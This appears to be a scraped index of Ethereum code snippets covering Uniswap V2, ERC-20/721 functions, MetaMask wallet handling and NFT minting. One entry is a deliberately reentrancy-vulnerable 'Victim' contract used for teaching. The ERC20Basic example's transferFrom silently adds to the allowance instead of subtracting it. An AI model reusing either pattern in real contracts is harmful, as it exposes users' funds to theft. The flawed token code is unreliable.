supporting tokens with transfer fees. It transfers the input tokens, performs the swap to WETH, then unwraps WETH to ETH and sends to the recipient.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction swapExactTokensForETHSupportingFeeOnTransferTokens(\n    uint amountIn,\n    uint amountOutMin,\n    address[] calldata path,\n    address to,\n    uint deadline\n)\n    external\n    virtual\n    override\n    ensure(deadline)\n{\n    require(path[path.length - 1] == WETH, 'UniswapV2Router: INVALID_PATH');\n    TransferHelper.safeTransferFrom(\n        path[0], msg.sender, UniswapV2Library.pairFor(factory, path[0], path[1]), amountIn\n    );\n    _swapSupportingFeeOnTransferTokens(path, address(this));\n    uint amountOut = IERC20(WETH).balanceOf(address(this));\n    require(amountOut >= amountOutMin, 'UniswapV2Router: INSUFFICIENT_OUTPUT_AMOUNT');\n    IWETH(WETH).withdraw(amountOut);\n    TransferHelper.safeTransferETH(to, amountOut);\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Wallet Connection Handler in React\nDESCRIPTION: Function that handles wallet connection button clicks by calling the connectWallet utility function and updating component state with the response. This follows the Model-View-Controller pattern by keeping implementation details separate from the UI component.\n\nLANGUAGE: javascript\nCODE:\n```\nconst connectWalletPressed = async () => {\n  const walletResponse = await connectWallet()\n  setStatus(walletResponse.status)\n  setWallet(walletResponse.address)\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Wallet Connection Handler in React\nDESCRIPTION: Function that handles wallet connection button clicks by calling the connectWallet utility function and updating component state with the response. This follows the Model-View-Controller pattern by keeping implementation details separate from the UI component.\n\nLANGUAGE: javascript\nCODE:\n```\nconst connectWalletPressed = async () => {\n  const walletResponse = await connectWallet()\n  setStatus(walletResponse.status)\n  setWallet(walletResponse.address)\n}\n```\n\n----------------------------------------\n\nTITLE: Complete updateMessage Function for Ethereum Transaction Handling\nDESCRIPTION: The complete implementation of the updateMessage function that handles input validation, sets up transaction parameters, signs the transaction with MetaMask, and returns appropriate status messages based on the transaction outcome.\n\nLANGUAGE: javascript\nCODE:\n```\nexport const updateMessage = async (address, message) => {\n  //input error handling\n  if (!window.ethereum || address === null) {\n    return {\n      status:\n        \"💡 Connect your MetaMask wallet to update the message on the blockchain.\",\n    }\n  }\n\n  if (message.trim() === \"\") {\n    return {\n      status: \"❌ Your message cannot be an empty string.\",\n    }\n  }\n\n  //set up transaction parameters\n  const transactionParameters = {\n    to: contractAddress, // Required except during contract publications.\n    from: address, // must match user's active address.\n    data: helloWorldContract.methods.update(message).encodeABI(),\n  }\n\n  //sign the transaction\n  try {\n    const txHash = await window.ethereum.request({\n      method: \"eth_sendTransaction\",\n      params: [transactionParameters],\n    })\n    return {\n      status: (\n        <span>\n          ✅{\" \"}\n          <a target=\"_blank\" href={`https://goerli.etherscan.io/tx/${txHash}`}>\n            View the status of your transaction on Etherscan!\n          </a>\n          <br />\n          ℹ️ Once the transaction is verified by the network, the message will\n          be updated automatically.\n        </span>\n      ),\n    }\n  } catch (error) {\n    return {\n      status: \"😥 \" + error.message,\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Complete NFT Minting Script with Pinata IPFS Implementation\nDESCRIPTION: This expanded script demonstrates a complete implementation of the NFT minting process, including environment configuration, transaction creation, signing, and execution. It calls the mintNFT function with an IPFS URI from Pinata that points to the NFT metadata.\n\nLANGUAGE: javascript\nCODE:\n```\nrequire(\"dotenv\").config()\nconst API_URL = process.env.API_URL\nconst PUBLIC_KEY = process.env.PUBLIC_KEY\nconst PRIVATE_KEY = process.env.PRIVATE_KEY\n\nconst { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\")\nconst web3 = createAlchemyWeb3(API_URL)\n\nconst contract = require(\"../artifacts/contracts/MyNFT.sol/MyNFT.json\")\nconst contractAddress = \"0x5a738a5c5fe46a1fd5ee7dd7e38f722e2aef7778\"\nconst nftContract = new web3.eth.Contract(contract.abi, contractAddress)\n\nasync function mintNFT(tokenURI) {\n  const nonce = await web3.eth.getTransactionCount(PUBLIC_KEY, \"latest\") //get latest nonce\n\n  //the transaction\n  const tx = {\n    from: PUBLIC_KEY,\n    to: contractAddress,\n    nonce: nonce,\n    gas: 500000,\n    data: nftContract.methods.mintNFT(PUBLIC_KEY, tokenURI).encodeABI(),\n  }\n\n  const signPromise = web3.eth.accounts.signTransaction(tx, PRIVATE_KEY)\n  signPromise\n    .then((signedTx) => {\n      web3.eth.sendSignedTransaction(\n        signedTx.rawTransaction,\n        function (err, hash) {\n          if (!err) {\n            console.log(\n              \"The hash of your transaction is: \",\n              hash,\n              \"\\nCheck Alchemy's Mempool to view the status of your transaction!\"\n            )\n          } else {\n            console.log(\n              \"Something went wrong when submitting your transaction:\",\n              err\n            )\n          }\n        }\n      )\n    })\n    .catch((err) => {\n      console.log(\"Promise failed:\", err)\n    })\n}\n\nmintNFT(\"ipfs://QmYueiuRNmL4MiA2GwtVMm6ZagknXnSpQnB3z2gWbz36hP\")\n```\n\n----------------------------------------\n\nTITLE: Connecting to Ethereum Nodes using Ethers.js\nDESCRIPTION: This snippet demonstrates how to connect to an Ethereum node using Ethers.js, setting up a provider and signer for blockchain interactions. It uses the BrowserProvider to wrap MetaMask's window.ethereum interface.\n\nLANGUAGE: javascript\nCODE:\n```\n// A BrowserProvider wraps a standard Web3 provider, which is\n// what MetaMask injects as window.ethereum into each page\nconst provider = new ethers.BrowserProvider(window.ethereum)\n\n// The MetaMask plugin also allows signing transactions to\n// send ether and pay to change state within the blockchain.\n// For this, we need the account signer...\nconst signer = provider.getSigner()\n```\n\n----------------------------------------\n\nTITLE: Storing Pair Information and Emitting Creation Event in Uniswap V2\nDESCRIPTION: Updates state variables to track the new pair exchange and emits a PairCreated event. The mapping is populated in both directions and the pair is added to the allPairs array.\n\nLANGUAGE: solidity\nCODE:\n```\n        getPair[token0][token1] = pair;\n        getPair[token1][token0] = pair; // populate mapping in the reverse direction\n        allPairs.push(pair);\n        emit PairCreated(token0, token1, pair, allPairs.length);\n    }\n```\n\n----------------------------------------\n\nTITLE: Creating a Hello World Smart Contract in Solidity\nDESCRIPTION: A basic smart contract that stores a message upon creation and can be updated via the update() function. It demonstrates state variables, constructors, and public functions in Solidity.\n\nLANGUAGE: solidity\nCODE:\n```\n// Specifies the version of Solidity, using semantic versioning.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity ^0.7.0;\n\n// Defines a contract named `HelloWorld`.\n// A contract is a collection of functions and data (its state). Once deployed, a contract resides at a specific address on the Ethereum blockchain. Learn more: https://solidity.readthedocs.io/en/v0.5.10/structure-of-a-contract.html\ncontract HelloWorld {\n\n   // Declares a state variable `message` of type `string`.\n   // State variables are variables whose values are permanently stored in contract storage. The keyword `public` makes variables accessible from outside a contract and creates a function that other contracts or clients can call to access the value.\n   string public message;\n\n   // Similar to many class-based object-oriented languages, a constructor is a special function that is only executed upon contract creation.\n   // Constructors are used to initialize the contract's data. Learn more:https://solidity.readthedocs.io/en/v0.5.10/contracts.html#constructors\n   constructor(string memory initMessage) {\n\n      // Accepts a string argument `initMessage` and sets the value into the contract's `message` storage variable).\n      message = initMessage;\n   }\n\n   // A public function that accepts a string argument and updates the `message` storage variable.\n   function update(string memory newMessage) public {\n      message = newMessage;\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Instantiating Smart Contract Object in interact.js\nDESCRIPTION: Code to create a contract instance using Web3.js with the contract ABI and address. This instance allows the application to call functions on the smart contract.\n\nLANGUAGE: javascript\nCODE:\n```\n// interact.js\nexport const helloWorldContract = new web3.eth.Contract(\n  contractABI,\n  contractAddress\n)\n```\n\n----------------------------------------\n\nTITLE: Implementing decreaseAllowance for ERC20 in Solidity\nDESCRIPTION: The decreaseAllowance function is another OpenZeppelin safety addition that atomically decreases the allowance granted to a spender. It uses safe math to prevent underflows and reverts if the subtraction would result in a negative value.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev Atomically decreases the allowance granted to `spender` by the caller.\n *\n * This is an alternative to {approve} that can be used as a mitigation for\n * problems described in {IERC20-approve}.\n *\n * Emits an {Approval} event indicating the updated allowance.\n *\n * Requirements:\n *\n * - `spender` cannot be the zero address.\n * - `spender` must have allowance for the caller of at least\n * `subtractedValue`.\n */\nfunction decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\n    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue,\n            \"ERC20: decreased allowance below zero\"));\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC-20 Interface and Basic Token in Solidity\nDESCRIPTION: Defines the IERC20 interface and implements a basic ERC-20 token contract with standard functionality including transfer, approve, and transferFrom methods. The token has a fixed supply of 10 ether (10^19 tokens when accounting for decimals).\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.8.0;\n\ninterface IERC20 {\n\n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function allowance(address owner, address spender) external view returns (uint256);\n\n    function transfer(address recipient, uint256 amount) external returns (bool);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\n\ncontract ERC20Basic is IERC20 {\n\n    string public constant name = \"ERC20Basic\";\n    string public constant symbol = \"ERC\";\n    uint8 public constant decimals = 18;\n\n\n    mapping(address => uint256) balances;\n\n    mapping(address => mapping (address => uint256)) allowed;\n\n    uint256 totalSupply_ = 10 ether;\n\n\n   constructor() {\n    balances[msg.sender] = totalSupply_;\n    }\n\n    function totalSupply() public override view returns (uint256) {\n    return totalSupply_;\n    }\n\n    function balanceOf(address tokenOwner) public override view returns (uint256) {\n        return balances[tokenOwner];\n    }\n\n    function transfer(address receiver, uint256 numTokens) public override returns (bool) {\n        require(numTokens <= balances[msg.sender]);\n        balances[msg.sender] = balances[msg.sender]-numTokens;\n        balances[receiver] = balances[receiver]+numTokens;\n        emit Transfer(msg.sender, receiver, numTokens);\n        return true;\n    }\n\n    function approve(address delegate, uint256 numTokens) public override returns (bool) {\n        allowed[msg.sender][delegate] = numTokens;\n        emit Approval(msg.sender, delegate, numTokens);\n        return true;\n    }\n\n    function allowance(address owner, address delegate) public override view returns (uint) {\n        return allowed[owner][delegate];\n    }\n\n    function transferFrom(address owner, address buyer, uint256 numTokens) public override returns (bool) {\n        require(numTokens <= balances[owner]);\n        require(numTokens <= allowed[owner][msg.sender]);\n\n        balances[owner] = balances[owner]-numTokens;\n        allowed[owner][msg.sender] = allowed[owner][msg.sender]+numTokens;\n        balances[buyer] = balances[buyer]+numTokens;\n        emit Transfer(owner, buyer, numTokens);\n        return true;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Sending Ethereum Transaction with walletSigner\nDESCRIPTION: JavaScript code to submit a transaction to the Ethereum network and handle the response with a promise chain.\n\nLANGUAGE: javascript\nCODE:\n```\nwalletSigner.sendTransaction(tx).then((transaction) => {\n  console.dir(transaction)\n  alert(\"Send finished!\")\n})\n```\n\n----------------------------------------\n\nTITLE: 再入可能性（リエントランシー）の脆弱性を持つVictimコントラクト（Solidity）\nDESCRIPTION: 再入可能性攻撃に対して脆弱なスマートコントラクトの例。このコントラクトではユーザーがETHを入出金できますが、外部呼び出し後に残高の更新を行うため、攻撃者が資金を複数回引き出せる脆弱性があります。\n\nLANGUAGE: solidity\nCODE:\n```\n// このコントラクトには、脆弱性があります。 プロダクションでは使用しないでください。\n\ncontract Victim {\n    mapping (address => uint256) public balances;\n\n    function deposit() external payable {\n        balances[msg.sender] += msg.value;\n    }\n\n    function withdraw() external {\n        uint256 amount = balances[msg.sender];\n        (bool success, ) = msg.sender.call.value(amount)(\"\");\n        require(success);\n        balances[msg.sender] = 0;\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Detecting Contract Addresses in Solidity\nDESCRIPTION: Implements the isContract function that determines if an address is a contract by checking its code size using inline assembly. Returns true if the address contains code, indicating it's a contract.\n\nLANGUAGE: Solidity\nCODE:\n```\nfunction isContract(address account) internal view returns (bool) {\n    uint256 size;\n    // Currently there is no better way to check if there is a contract in an address\n    // than to check the size of the code at that address.\n    // See https://ethereum.stackexchange.com/a/14016/36603\n    // for more details about how this works.\n    // TODO Check this again before the Serenity release, because all addresses will be\n    // contracts then.\n    // solium-disable-next-line security/no-inline-assembly\n    assembly {\n        size := extcodesize(account)\n    }\n    return size > 0;\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing a Basic Token Contract in Solidity for Ethereum\nDESCRIPTION: This Solidity contract implements a basic token with ownership, balance tracking, and transfer capabilities. It includes state variables for tracking the owner and token balances, events for logging transfers, and functions for minting new tokens (owner-only) and transferring tokens between addresses. The contract demonstrates fundamental Solidity concepts like mappings, access control via require statements, and event emission.\n\nLANGUAGE: solidity\nCODE:\n```\npragma solidity ^0.5.10;\n\ncontract Token {\n    // An `address` is comparable to an email address - it's used to identify an account on Ethereum.\n    // Addresses can represent a smart contract or an external (user) accounts.\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/types.html#address\n    address public owner;\n\n    // A `mapping` is essentially a hash table data structure.\n    // This `mapping` assigns an unsigned integer (the token balance) to an address (the token holder).\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/types.html#mapping-types\n    mapping (address => uint) public balances;\n\n    // Events allow for logging of activity on the blockchain.\n    // Ethereum clients can listen for events in order to react to contract state changes.\n    // Learn more: https://solidity.readthedocs.io/en/v0.5.10/contracts.html#events\n    event Transfer(address from, address to, uint amount);\n\n    // Initializes the contract's data, setting the `owner`\n    // to the address of the contract creator.\n    constructor() public {\n        // All smart contracts rely on external transactions to trigger its functions.\n        // `msg` is a global variable that includes relevant data on the given transaction,\n        // such as the address of the sender and the ETH value included in the transaction.\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/units-and-global-variables.html#block-and-transaction-properties\n        owner = msg.sender;\n    }\n\n    // Creates an amount of new tokens and sends them to an address.\n    function mint(address receiver, uint amount) public {\n        // `require` is a control structure used to enforce certain conditions.\n        // If a `require` statement evaluates to `false`, an exception is triggered,\n        // which reverts all changes made to the state during the current call.\n        // Learn more: https://solidity.readthedocs.io/en/v0.5.10/control-structures.html#error-handling-assert-require-revert-and-exceptions\n\n        // Only the contract owner can call this function\n        require(msg.sender == owner, \"You are not the owner.\");\n\n        // Enforces a maximum amount of tokens\n        require(amount < 1e60, \"Maximum issuance exceeded\");\n\n        // Increases the balance of `receiver` by `amount`\n        balances[receiver] += amount;\n    }\n\n    // Sends an amount of existing tokens from any caller to an address.\n    function transfer(address receiver, uint amount) public {\n        // The sender must have enough tokens to send\n        require(amount <= balances[msg.sender], \"Insufficient balance.\");\n\n        // Adjusts token balances of the two addresses\n        balances[msg.sender] -= amount;\n        balances[receiver] += amount;\n\n        // Emits the event defined earlier\n        emit Transfer(msg.sender, receiver, amount);\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing Safe TransferFrom in TransferHelper\nDESCRIPTION: Helper function for safely executing ERC20 transferFrom operations that handles both revert cases and false returns consistently. Uses low-level calls with function selector 0x23b872dd for the ERC20 transferFrom function.\n\nLANGUAGE: solidity\nCODE:\n```\n    function safeTransferFrom(\n        address token,\n        address from,\n        address to,\n        uint256 value\n    ) internal {\n        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));\n        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));\n        require(\n            success && (data.length == 0 || abi.decode(data, (bool))),\n            'TransferHelper::transferFrom: transferFrom failed'\n        );\n    }\n```\n\n----------------------------------------\n\nTITLE: Implementing Account Freezing Function in Solidity\nDESCRIPTION: A function that freezes a specified account. It includes the onlyOwner modifier to restrict access, checks if the account is already frozen to prevent redundant operations, and emits an event when successful.\n\nLANGUAGE: solidity\nCODE:\n```\nfunction freezeAccount(address addr)\n  public\n  onlyOwner\n{\n    require(!frozenAccounts[addr], \"Account already frozen\");\n    frozenAccounts[addr] = true;\n    emit AccountFrozen(addr);\n}  // freezeAccount\n```\n\n----------------------------------------\n\nTITLE: Completing ERC20 TransferFrom Function with Allowance Check in Solidity\nDESCRIPTION: This code completes the transferFrom function by reducing the allowance after the transfer. It uses the .sub() method which includes safety checks to prevent underflow and reverts with an error message if the allowance is insufficient.\n\nLANGUAGE: solidity\nCODE:\n```\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount,\n             \"ERC20: transfer amount exceeds allowance\"));\n        return true;\n    }\n```\n\n----------------------------------------\n\nTITLE: ERC-20 Required Events Implementation in Solidity\nDESCRIPTION: Defines the required events that must be emitted by a compliant ERC-20 token contract. These events provide notifications for token transfers and approval operations.\n\nLANGUAGE: solidity\nCODE:\n```\nevent Transfer(address indexed _from, address indexed _to, uint256 _value)\nevent Approval(address indexed _owner, address indexed _spender, uint256 _value)\n```\n\n----------------------------------------\n\nTITLE: Using useEffect to Load Message in React Component\nDESCRIPTION: React useEffect hook implementation to load the current message from the smart contract when the component mounts. This updates the component's state with the message from the contract.\n\nLANGUAGE: javascript\nCODE:\n```\n// HelloWorld.js\n\n//called only once\nuseEffect(async () => {\n  const message = await loadCurrentMessage()\n  setMessage(message)\n}, [])\n```\n\n----------------------------------------\n\nTITLE: Defining Balance Storage in ERC20 Contract\nDESCRIPTION: This mapping stores the token balance for each address. It is private but blockchain data is public - the visibility modifier only restricts access from other contracts not external observers.\n\nLANGUAGE: solidity\nCODE:\n```\n    mapping (address => uint256) private _balances;\n```\n\n----------------------------------------\n\nTITLE: Verifying Proper ERC-721 Token Reception in safeTransferFrom\nDESCRIPTION: This code verifies that the receiving contract properly implements the ERC-721 token receiver interface by checking the return value of the onERC721Received function call.\n\nLANGUAGE: vyper\nCODE:\n```\n        # Throws if transfer destination is a contract which does not implement 'onERC721Received'\n        assert returnValue == method_id(\"onERC721Received(address,address,uint256,bytes)\", output_type=bytes32)\n```\n\n----------------------------------------\n\nTITLE: ERC20 Token Contract Implementation in Solidity\nDESCRIPTION: Complete ERC20 token contract implementation with standard functions for transfers, approvals, and balance checking. The token is initialized with the name 'Basic', symbol 'BSC', and 18 decimals. It includes safe math operations to prevent overflow.\n\nLANGUAGE: solidity\nCODE:\n```\n60806040523480156200001157600080fd5b506040516200153938038062001539833981810160405260208110156200003757600080fd5b81019080805190602001909291905050506040518060400160405280600581526020017f42617369630000000000000000000000000000000000000000000000000000008152506040518060400160405280600381526020017f42534300000000000000000000000000000000000000000000000000000000008152508160039080519060200190620000cc92919062000389565b508060049080519060200190620000e592919062000389565b506012600560006101000a81548160ff021916908360ff16021790555050506200011633826200011d60201b60201c565b5062000438565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415620001c1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f45524332303a206d696e7420746f20746865207a65726f20616464726573730081525060200191505060405180910390fd5b620001d560008383620002fb60201b60201c565b620001f1816002546200030060201b62000f2d1790919060201c565b6002819055506200024f816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020546200030060201b62000f2d1790919060201c565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff16600073ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a35050565b505050565b6000808284019050838110156200037f576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601b8152602001807f536166654d6174683a206164646974696f6e206f766572666c6f77000000000081525060200191505060405180910390fd5b8091505092915050565b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f10620003cc57805160ff1916838001178555620003fd565b82800160010185558215620003fd579182015b82811115620003fc578251825591602001919060010190620003df565b5b5090506200040c919062000410565b5090565b6200043591905b808211156200043157600081600090555060010162000417565b5090565b90565b6110f180620004486000396000f3fe608060405234801561001057600080fd5b50600436106100a95760003560e01c80633950935111610071578063395093511461025f57806370a08231146102c557806395d89b411461031d578063a457c2d7146103a0578063a9059cbb14610406578063dd62ed3e1461046c576100a9565b806306fdde03146100ae578063095ea7b31461013157806318160ddd1461019757806323b872dd146101b5578063313ce5671461023b575b600080fd5b6100b66104e4565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156100f65780820151818401526020810190506100db565b50505050905090810190601f1680156101235780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b61017d6004803603604081101561014757600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610586565b604051808215151515815260200191505060405180910390f35b61019f6105a4565b6040518082815260200191505060405180910390f35b610221600480360360608110156101cb57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803590602001909291905050506105ae565b604051808215151515815260200191505060405180910390f35b610243610687565b604051808260ff1660ff16815260200191505060405180910390f35b6102ab6004803603604081101561027557600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061069e565b604051808215151515815260200191505060405180910390f35b610307600480360360208110156102db57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610751565b6040518082815260200191505060405180910390f35b610325610799565b6040518080602001828103825283818151815260200191508051906020019080838360005b8381101561036557808201518184015260208101905061034a565b50505050905090810190601f1680156103925780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b6103ec600480360360408110156103b657600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff1690602001909291908035906020019092919050505061083b565b604051808215151515815260200191505060405180910390f35b6104526004803603604081101561041c57600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610908565b604051808215151515815260200191505060405180910390f35b6104ce6004803603604081101561048257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610926565b6040518082815260200191505060405180910390f35b606060038054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561057c5780601f106105515761010080835404028352916020019161057c565b820191906000526020600020905b81548152906001019060200180831161055f57829003601f168201915b5050505050905090565b600061059a6105936109ad565b84846109b5565b6001905092915050565b6000600254905090565b60006105bb848484610bac565b61067c846105c76109ad565b6106778560405180606001604052806028815260200161102660289139600160008b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020600061062d6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b600190509392505050565b6000600560009054906101000a900460ff16905090565b60006107476106ab6109ad565b8461074285600160006106bc6109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008973ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6109b5565b6001905092915050565b60008060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020549050919050565b606060048054600181600116156101000203166002900480601f0160208091040260200160405190810160405280929190818152602001828054600181600116156101000203166002900480156108315780601f1061080657610100808354040283529160200191610831565b820191906000526020600020905b81548152906001019060200180831161081457829003601f168201915b5050505050905090565b60006108fe6108486109ad565b846108f98560405180606001604052806025815260200161109760259139600160006108726109ad565b73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008a73ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6109b5565b6001905092915050565b600061091c6109156109ad565b8484610bac565b6001905092915050565b6000600160008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054905092915050565b600033905090565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610a3b576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260248152602001806110736024913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610ac1576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526022815260200180610fde6022913960400191505060405180910390fd5b80600160008573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002060008473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167f8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925836040518082815260200191505060405180910390a3505050565b600073ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff161415610c32576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252602581526020018061104e6025913960400191505060405180910390fd5b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161415610cb8576040517f08c379a0000000000000000000000000000000000000000000000000000000008152600401808060200182810382526023815260200180610fbb6023913960400191505060405180910390fd5b610cc3838383610fb5565b610d2e81604051806060016040528060268152602001611000602691396000808773ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610e6d9092919063ffffffff16565b6000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002081905550610dc1816000808573ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200190815260200160002054610f2d90919063ffffffff16565b6000808473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001908152602001600020819055508173ffffffffffffffffffffffffffffffffffffffff168373ffffffffffffffffffffffffffffffffffffffff167fddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef836040518082815260200191505060405180910390a3505050565b6000838311158290610f1a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825283818151815260200191508051906020019080838360005b83811015610edf578082015181840152602081019050610ec4565b50505050905090810190601f168015610f0c5780820380516001836020036101000a031916815260200191505b509250505060405180910390fd5b5060008385039050809150509392505050565b600080828401905\n```\n\n----------------------------------------\n\nTITLE: Sending ETH Transaction with Alchemy Web3 in JavaScript\nDESCRIPTION: This script creates and sends an ETH transaction on the Ethereum network using Alchemy Web3. It loads environment variables for API URL and private key, creates a transaction with appropriate nonce, gas, and value parameters, signs it, and sends it to the network.\n\nLANGUAGE: javascript\nCODE:\n```\nasync function main() {\n    require('dotenv').config();\n    const { API_URL, PRIVATE_KEY } = process.env;\n    const { createAlchemyWeb3 } = require(\"@alch/alchemy-web3\");\n    const web3 = createAlchemyWeb3(API_URL);\n    const myAddress = '0x610Ae88399fc1687FA7530Aac28eC2539c7d6d63' //TODO: replace this address with your own public address\n\n    const nonce = await web3.eth.getTransactionCount(myAddress, 'latest'); // nonce starts counting from 0\n\n    const transaction = {\n     'to': '0x31B98D14007bDEe637298086988A0bBd31184523', // faucet address to return eth\n     'value': 1000000000000000000, // 1 ETH\n     'gas': 30000,\n     'nonce': nonce,\n     // optional data field to send message or execute smart contract\n    };\n\n    const signedTx = await web3.eth.accounts.signTransaction(transaction, PRIVATE_KEY);\n\n    web3.eth.sendSignedTransaction(signedTx.rawTransaction, function(error, hash) {\n    if (!error) {\n      console.log(\"🎉 The hash of your transaction is: \", hash, \"\\n Check Alchemy's Mempool to view the status of your transaction!\");\n    } else {\n      console.log(\"❗Something went wrong while submitting your transaction:\", error)\n    }\n   });\n}\n\nmain();\n```\n\n----------------------------------------\n\nTITLE: Implementing allowance Function in ERC-20\nDESCRIPTION: The allowance function is part of the ERC-20 delegation mechanism. It allows checking how many tokens a spender is allowed to spend on behalf of an owner. This is a view function that doesn't modify state and returns a uint256.\n\nLANGUAGE: solidity\nCODE:\n```\n    /**\n     * @dev Returns the remaining number of tokens that `spender` will be\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\n     * zero by default.\n     *\n     * This value changes when {approve} or {transferFrom} are called.\n     */\n    function allowance(address owner, address spender) external view returns (uint256);\n```\n\n----------------------------------------\n\nTITLE: Implementing ERC20 Token Transfer Function in Solidity\nDESCRIPTION: Implements the transfer function for ERC20 tokens that allows sending tokens from the caller's address to a recipient. The function returns a boolean value that is always true on success or reverts on failure.\n\nLANGUAGE: solidity\nCODE:\n```\n/**\n * @dev See {IERC20-transfer}.\n *\n * Persyaratan:\n *\n * - `penerima` tidak dapat berupa alamat kosong.\n * - pemanggil harus memiliki saldo `jumlah` minimum.\n */\nfunction transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n```\n\nLANGUAGE: solidity\nCODE:\n```\n    _transfer(_msgSender(), recipient, amount);\n    return true;\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a HelloWorld Smart Contract in Solidity\nDESCRIPTION: A simple Solidity smart contract that stores a message that can be updated. It includes a constructor for initialization, an update function to change the message, and an event that's emitted when the message is updated.\n\nLANGUAGE: solidity\nCODE:\n```\n// Specifies the version of Solidity, using semantic versioning.\n// Learn more: https://solidity.readthedocs.io/en/v0.5.10/layout-of-source-files.html#pragma\npragma solidity 